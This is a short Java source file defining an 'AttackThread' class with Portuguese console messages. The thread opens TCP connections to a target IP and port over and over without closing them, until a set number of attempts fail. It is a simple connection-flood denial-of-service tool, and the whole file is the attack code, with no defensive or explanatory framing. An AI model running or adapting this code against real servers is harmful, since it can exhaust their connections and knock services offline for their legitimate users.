package com.main;
import java.net.Socket;

public class AttackThread extends Thread
{
	private int sleepBetween;
	private int timeout;
	private String ip;
	private int port;
	private Socket socket;
	private int totalConnections;
	private int accepted;
	private int failed;
	
	public AttackThread(String ip, int port, int sleepBetween, int timeout)
	{
		this.sleepBetween = sleepBetween;
		this.timeout = timeout;
		this.ip = ip;
		this.port = port;
	}
	public void run()
	{
		totalConnections = 0;
		accepted = 0;
		failed = 0;
		System.out.println("Thread iniciada!");
		while(timeout != failed)
		{
			try
			{
				socket = new Socket(ip, port);
				System.out.println("Conexao bem sucedida! #"+accepted);
				accepted++;
			} catch(Exception ex) { failed++; totalConnections++;}
			
			try
			{
				Thread.sleep(sleepBetween);
			} catch(Exception ex)  {}
		}
		System.out.println("Acabar com Threads");
		stop();
	}
}
